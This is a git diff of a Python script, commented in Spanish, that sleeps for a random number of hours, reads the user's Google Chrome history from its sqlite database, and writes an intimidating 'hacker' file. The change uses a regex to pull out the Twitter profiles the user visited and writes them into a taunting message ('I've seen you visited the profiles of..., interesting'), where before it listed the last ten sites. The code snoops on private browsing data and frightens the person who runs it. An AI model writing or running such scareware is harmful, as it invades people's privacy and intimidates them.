@@ -2,6 +2,7 @@
 #Importando librerias
 
 import os
+import re
 import sqlite3
 from time import sleep
 from random import randrange
@@ -41,9 +42,12 @@ def delay_action():
     sleep(n_houers)
 
 def check_history_and_scare_user(hacker_file, chrome_history):
-    for item in chrome_history[:10]:
-        hacker_file.write(f"He visto que has visitado la web '{item[0]}', interesante...\n")
-    hacker_file.close()
+    profiles_visited = []
+    for item in chrome_history:
+        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
+        if results and results[0] not in ["notifications", "home"]:
+            profiles_visited.append(results[0])
+    hacker_file.write(f"He visto que has visitado los perfiles de {', '.join(profiles_visited)}, interesante.....")
 
 def main():
     #Esperamos algunas horas para que se ejecute el script
@@ -57,7 +61,6 @@ def main():
 
     #Obtenemos su historial de Google Chrome cuando sea posible
     chrome_history = get_chrome_history()
-    print(chrome_history)
     check_history_and_scare_user(hacker_file, chrome_history)
 
 if __name__ == "__main__":
